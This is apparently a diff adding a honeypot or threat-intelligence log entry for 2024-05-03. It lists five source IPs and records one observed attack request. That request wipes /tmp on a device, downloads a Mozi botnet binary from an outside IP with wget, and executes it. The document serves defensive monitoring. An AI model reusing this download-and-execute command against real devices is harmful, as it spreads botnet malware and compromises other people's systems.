@@ -1,0 +1,19 @@
+Top 5 IPs for 2024-05-03 :
+
+200.2.161.213 -> Very interesting IP a lot of scanning activity from this IP, this IP is not tagged as malcious in most of the opensource threat intel DBs
+112.184.40.41
+45.33.80.243
+203.33.225.70
+111.53.104.249
+
+
+
+Malware Download:
+
+None observed
+
+Commands/exploits observed:
+
+/shell?cd+/tmp;rm+-rf+*;wget+http://102.33.40.187:53561/Mozi.7;chmod+777+Mozi.7;/tmp/Mozi.7+jaws
+
+
